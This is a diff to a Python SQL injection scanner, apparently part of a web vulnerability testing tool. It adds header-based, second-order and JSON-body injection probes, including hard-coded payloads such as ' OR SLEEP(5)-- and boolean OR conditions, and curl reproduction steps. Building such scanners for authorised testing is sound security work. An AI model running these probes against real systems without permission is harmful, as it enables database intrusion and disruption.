@@ -13,8 +13,10 @@ Maturity: Level 4 (OOB-confirmed)
 import hashlib
 import json
 import time
+import re
+import copy
 from typing import Any, Optional
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, urljoin
 
 from models.finding import Finding
 from models.evidence import TimingEvidence
@@ -118,6 +120,34 @@ class SQLiScanner(ScannerBase):
     def __init__(self, config: dict, recon: dict, container=None):
         super().__init__(config, recon, container=container)
 
+    def _enrich_finding(self, f, evidence_count: int, verification_stage_value: str, signal_count: int = 0) -> None:
+        if signal_count <= 0:
+            super()._enrich_finding(f, evidence_count, verification_stage_value)
+            return
+        from models.finding import VerificationStage, EvidenceStrength
+        stage_enum = VerificationStage(verification_stage_value)
+        if self.SCANNER_MATURITY >= 4:
+            fp_risk = "LOW"
+        elif self.SCANNER_MATURITY == 3:
+            fp_risk = "MEDIUM"
+        else:
+            fp_risk = "HIGH"
+        strength_map = {
+            VerificationStage.DETECTED: EvidenceStrength.WEAK,
+            VerificationStage.VALIDATED: EvidenceStrength.MODERATE,
+            VerificationStage.EXPLOITABLE: EvidenceStrength.STRONG,
+            VerificationStage.VERIFIED: EvidenceStrength.VERIFIED,
+        }
+        evidence_strength = strength_map.get(stage_enum, EvidenceStrength.WEAK)
+        score = self.calculate_confidence(signal_count, stage_enum, evidence_count, fp_risk)
+        if f.get("confidence_score", 0) == 0:
+            f["confidence_score"] = score
+        if verification_stage_value == VerificationStage.VERIFIED.value:
+            current = f.get("confidence_score", 0)
+            f["confidence_score"] = min(max(current, 86), 100)
+        f["evidence_strength"] = evidence_strength.value
+        f["false_positive_risk"] = fp_risk
+
     # ── Detection phase ─────────────────────────────────────────────────
 
     def detect(self, url: str, parameter: str | None = None) -> SQLiDetectionResult | None:
@@ -215,13 +245,25 @@ class SQLiScanner(ScannerBase):
         oob_host = self.config.get("oob_host")
         urls = self.recon.get("urls", []) if target_urls is None else target_urls
 
+        rest_pat = re.compile(r'/(users|orders|accounts|products|items|posts|comments|entries|profiles|settings)/(\d+|[a-f0-9-]+)', re.I)
+
         for url in urls:
             if not self._in_scope(url):
                 continue
             try:
                 parsed = urlparse(url)
                 query = parse_qs(parsed.query, keep_blank_values=True)
-                for param, _ in query.items():
+                params = list(query.keys())
+                if self.recon:
+                    is_rest = bool(rest_pat.search(url))
+                    numeric_params = {p for p in params if p.isdigit() or any(c.isdigit() for c in p) and not re.search(r'[a-zA-Z]{4,}', p)}
+                    sql_keywords = {"id", "q", "s", "search", "query", "order", "sort", "filter", "page", "limit", "offset", "where", "select", "delete", "update", "username", "user", "email", "password"}
+                    params.sort(key=lambda p: (0 if p in numeric_params or p.lower() in sql_keywords or is_rest else 1))
+                baseline_timings = self.recon.get("baseline_timings") if self.recon else None
+                if baseline_timings:
+                    url_timings = baseline_timings.get(url, {})
+                    params.sort(key=lambda p: -url_timings.get(p, 0))
+                for param in params:
                     detection_result = self.detect(url, param)
                     if detection_result is None:
                         continue
@@ -229,7 +271,13 @@ class SQLiScanner(ScannerBase):
                     validation_result = self.validate(detection_result)
                     evidence_list = self.collect_evidence(detection_result, validation_result)
 
-                    signal_count = sum(1 for v in detection_result.signals.values() if v)
+                    raw_count = sum(1 for v in detection_result.signals.values() if v)
+                    has_oob = detection_result.signals.get("oob")
+                    has_inband = any(k != "oob" and v for k, v in detection_result.signals.items() if v)
+                    if has_oob:
+                        signal_count = 3 if has_inband else 2
+                    else:
+                        signal_count = raw_count
                     evidence_parts = [k for k, v in detection_result.signals.items() if v]
 
                     if detection_result.signals.get("oob"):
@@ -269,11 +317,13 @@ class SQLiScanner(ScannerBase):
                             if self.evidence_engine:
                                 self.evidence_engine.store(ev)
                                 self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
-                        self._enrich_finding(f, len(evidence_list), f["verification_stage"])
+                        self._enrich_finding(f, len(evidence_list), f["verification_stage"], signal_count=signal_count)
                         self._add_finding(f)
+
+                self._test_header_injection(url, oob_host)
             except Exception as e:
                 log(f"  [SQLi] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
-        
+
         for url in urls:
             if not self._in_scope(url):
                 continue
@@ -282,7 +332,174 @@ class SQLiScanner(ScannerBase):
             except Exception as e:
                 log(f"  [SQLi POST] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
 
+        forms = self.recon.get("forms", [])
+        all_urls = self.recon.get("urls", [])
+        if forms and all_urls:
+            try:
+                self._test_second_order(forms, all_urls, oob_host)
+            except Exception as e:
+                log(f"  [SQLi Second-Order] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
         return self._get_findings()
+
+    # ── Header-based SQLi injection ─────────────────────────────────────
+
+    def _test_header_injection(self, url: str, oob_host: str | None) -> None:
+        headers_to_test = [
+            "X-Forwarded-For",
+            "X-Real-IP",
+            "User-Agent",
+            "Referer",
+            "X-Custom-IP-Authorization",
+        ]
+        reflect_found = False
+        reflect_token = "hdr_reflect_chk_98765"
+        test_headers = {"X-Hdr-Reflect": reflect_token}
+        reflect_resp = safe_get(self.session, url, self.timeout, headers=test_headers)
+        if reflect_resp:
+            if reflect_token in reflect_resp.text:
+                reflect_found = True
+            vary = reflect_resp.headers.get("Vary", "")
+            for h in headers_to_test:
+                if h.lower() in vary.lower():
+                    reflect_found = True
+                    break
+        if not reflect_found:
+            return
+        baseline_errors = set()
+        baseline_resp = safe_get(self.session, url, self.timeout)
+        if baseline_resp:
+            baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
+        payloads = SQLI_PAYLOADS["error_based"]
+        for header_name in headers_to_test:
+            for payload in payloads:
+                inj_headers = {header_name: payload}
+                resp = safe_get(self.session, url, self.timeout, headers=inj_headers)
+                if not resp:
+                    continue
+                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
+                if new_errors:
+                    benign_headers = {header_name: "safe_value_123"}
+                    benign_resp = safe_get(self.session, url, self.timeout, headers=benign_headers)
+                    benign_clean = True
+                    if benign_resp:
+                        benign_errs = {e for e in SQLI_ERRORS if e in benign_resp.text.lower()} - baseline_errors
+                        if benign_errs:
+                            benign_clean = False
+                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
+                    merged_headers = dict(self.session.headers)
+                    merged_headers.update(inj_headers)
+                    f = self._build_finding(url, f"Header:{header_name}", signals,
+                        request_str=_build_curl("GET", url, merged_headers, cookies=safe_cookies_dict(self.session.cookies)),
+                        response_excerpt_str=resp.text[:500] if resp else "",
+                        signal_count=2)
+                    if f:
+                        f["title"] = f"SQL Injection via {header_name} header"
+                        f["details"] = f"Header '{header_name}': SQL error detected with differential confirmation"
+                        f["steps_to_reproduce"] = [
+                            f"curl -H '{header_name}: {payload}' '{url}'",
+                            f"Observe SQL error in response for malicious header value",
+                            f"No error when benign header value is used (differential confirms injection)",
+                        ]
+                        self._enrich_finding(f, 0, f["verification_stage"], signal_count=2)
+                        self._add_finding(f)
+                    break
+
+    # ── Second-order SQLi detection ─────────────────────────────────────
+
+    def _test_second_order(self, forms: list, urls: list, oob_host: str | None) -> None:
+        write_endpoints = []
+        for form in forms:
+            if form.get("method", "GET").upper() == "POST":
+                action = form.get("action", "")
+                if action:
+                    inputs = form.get("inputs", [])
+                    field_names = [i.get("name", "") for i in inputs if i.get("name")]
+                    write_endpoints.append((action, field_names))
+        if not write_endpoints:
+            return
+        for write_url, fields in write_endpoints:
+            write_path = urlparse(write_url).path.rstrip("/")
+            read_candidates = [
+                u for u in urls
+                if u.rstrip("/") != write_url.rstrip("/")
+                and urlparse(u).path.rstrip("/") == write_path
+            ]
+            if not read_candidates:
+                continue
+            read_url = read_candidates[0]
+            target_fields = [f for f in fields if f.lower() in ("id", "name", "email", "username", "search")]
+            if not target_fields:
+                target_fields = fields[:1] if fields else ["id"]
+            field_name = target_fields[0]
+            error_payloads = SQLI_PAYLOADS["error_based"]
+            baseline_resp = safe_get(self.session, read_url, self.timeout)
+            baseline_errors = set()
+            if baseline_resp:
+                baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
+            first_detected = False
+            if len(error_payloads) >= 3:
+                for payload in error_payloads[:3]:
+                    post_data = {field_name: payload}
+                    safe_post(self.session, write_url, data=post_data, timeout=self.timeout)
+                resp = safe_get(self.session, read_url, self.timeout)
+                if resp:
+                    new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
+                    if new_errors:
+                        first_detected = True
+            if not first_detected:
+                continue
+            if len(error_payloads) >= 6:
+                for payload in error_payloads[3:6]:
+                    post_data = {field_name: payload}
+                    safe_post(self.session, write_url, data=post_data, timeout=self.timeout)
+                resp2 = safe_get(self.session, read_url, self.timeout)
+                if resp2:
+                    second_errors = {e for e in SQLI_ERRORS if e in resp2.text.lower()} - baseline_errors
+                    if second_errors:
+                        f = finding(
+                            vuln_type="Second-Order SQL Injection",
+                            url=read_url,
+                            severity="high",
+                            details=f"Second-order SQLi confirmed via {write_url} -> {read_url}, dual probes confirmed",
+                            evidence=" | ".join(second_errors),
+                            request=_build_curl("GET", read_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
+                            response_excerpt=resp2.text[:500],
+                            verification_stage=VerificationStage.VALIDATED.value,
+                            parameter="second-order",
+                            steps_to_reproduce=[
+                                f"POST to {write_url} with SQL payload in field '{field_name}'",
+                                f"GET {read_url} and observe SQL error in response",
+                                f"Repeat with different payload — second cycle also produces error, confirming SQLi",
+                            ],
+                            validation_steps=[f"Two independent write-then-read cycles confirmed"],
+                        )
+                        if f:
+                            self._enrich_finding(f, 0, f["verification_stage"], signal_count=2)
+                            self._add_finding(f)
+                    else:
+                        f = finding(
+                            vuln_type="Second-Order SQL Injection",
+                            url=read_url,
+                            severity="medium",
+                            details=f"Potential second-order SQLi via {write_url} -> {read_url}, single cycle detected",
+                            evidence=" | ".join(new_errors),
+                            request=_build_curl("GET", read_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
+                            response_excerpt=resp.text[:500],
+                            verification_stage=VerificationStage.DETECTED.value,
+                            parameter="second-order",
+                            steps_to_reproduce=[
+                                f"POST to {write_url} with SQL payload in field '{field_name}'",
+                                f"GET {read_url} and observe SQL error in response",
+                                "Second cycle did not produce error — potential false positive",
+                            ],
+                            validation_steps=[f"Single write-then-read cycle detected"],
+                        )
+                        if f:
+                            self._enrich_finding(f, 0, f["verification_stage"], signal_count=1)
+                            self._add_finding(f)
+
+    # ── Per-parameter signal testing ────────────────────────────────────
 
     def _test_parameter_signals(self, url: str, param: str, original_value: str,
                                  payloads: dict, oob_host: Optional[str]) -> tuple[dict, Optional[str], Optional[TimingEvidence], list[str]]:
@@ -402,30 +619,66 @@ class SQLiScanner(ScannerBase):
         )
         return signals, trigger_resp, timing_ev
 
+    # ── POST body SQLi testing ─────────────────────────────────────────
+
     def _test_post_body(self, url: str, payloads: dict, oob_host: Optional[str]) -> None:
         baseline_errors: set[str] = set()
         try:
             baseline_resp = safe_post(self.session, url, data=json.dumps({"id": "1"}),
                                        headers={"Content-Type": "application/json"}, timeout=self.timeout)
             if baseline_resp:
-                baseline_errors = {e for e in SQLI_ERRORS if e in baseline_resp.text.lower()}
+                if baseline_resp.status_code != 200:
+                    return
+                body_lower = baseline_resp.text.lower()
+                if "login" in body_lower or "redirect" in body_lower or "sign in" in body_lower:
+                    return
+                baseline_errors = {e for e in SQLI_ERRORS if e in body_lower}
         except Exception:
-            pass
+            return
 
         headers = {"Content-Type": "application/json"}
         for payload in POST_SQLI_PAYLOADS["json"]:
             resp = safe_post(self.session, url, data=payload, headers=headers, timeout=self.timeout)
-            if resp:
-                new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
-                if new_errors:
-                    signals = {"error": True, "boolean": False, "time": False, "union": False, "oob": False}
-                    f = self._build_finding(url, "POST JSON body", signals,
-                        request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
-                        response_excerpt_str=resp.text[:500] if resp else "")
-                    if f:
-                        self._enrich_finding(f, 0, f["verification_stage"])
-                        self._add_finding(f)
-                break
+            if not resp:
+                continue
+            new_errors = {e for e in SQLI_ERRORS if e in resp.text.lower()} - baseline_errors
+            signals = {"error": bool(new_errors), "boolean": False, "time": False, "union": False, "oob": False}
+
+            if not new_errors:
+                continue
+
+            boolean_true_payload = '{"id": "\' OR \'1\'=\'1"}'
+            boolean_false_payload = '{"id": "\' OR \'1\'=\'2"}'
+            true_resp = safe_post(self.session, url, data=boolean_true_payload, headers=headers, timeout=self.timeout)
+            false_resp = safe_post(self.session, url, data=boolean_false_payload, headers=headers, timeout=self.timeout)
+            if true_resp and false_resp:
+                true_hash = hashlib.md5(true_resp.text.encode()).hexdigest()
+                false_hash = hashlib.md5(false_resp.text.encode()).hexdigest()
+                if true_hash != false_hash:
+                    signals["boolean"] = True
+
+            baseline_start = time.time()
+            safe_post(self.session, url, data=json.dumps({"id": "1"}), headers=headers, timeout=15, raise_for_status=False)
+            baseline_delay = time.time() - baseline_start
+            if baseline_delay < 0.5:
+                baseline_delay = 0.5
+            time_payload = '{"id": "\' OR SLEEP(5)--"}'
+            time_start = time.time()
+            time_resp = safe_post(self.session, url, data=time_payload, headers=headers, timeout=15, raise_for_status=False)
+            time_delay = time.time() - time_start
+            min_threshold = max(baseline_delay + 4, 5.0)
+            if time_resp and time_delay > min_threshold:
+                signals["time"] = True
+
+            signal_count = sum(1 for v in signals.values() if v)
+            f = self._build_finding(url, "POST JSON body", signals,
+                request_str=_build_curl("POST", url, dict(self.session.headers), data=payload, cookies=safe_cookies_dict(self.session.cookies)),
+                response_excerpt_str=resp.text[:500] if resp else "",
+                signal_count=signal_count)
+            if f:
+                self._enrich_finding(f, 0, f["verification_stage"], signal_count=signal_count)
+                self._add_finding(f)
+            break
 
         headers = {"Content-Type": "application/xml"}
         for payload in POST_SQLI_PAYLOADS["xml"]:
@@ -464,8 +717,10 @@ class SQLiScanner(ScannerBase):
             break
 
     def _build_finding(self, url: str, param: str, signals: dict,
-                       request_str: str = "", response_excerpt_str: str = "") -> Optional[dict]:
-        signal_count = sum(1 for v in signals.values() if v)
+                       request_str: str = "", response_excerpt_str: str = "",
+                       signal_count: int = 0) -> Optional[dict]:
+        if signal_count <= 0:
+            signal_count = sum(1 for v in signals.values() if v)
         evidence_parts = [k for k, v in signals.items() if v]
 
         if signals.get("oob"):
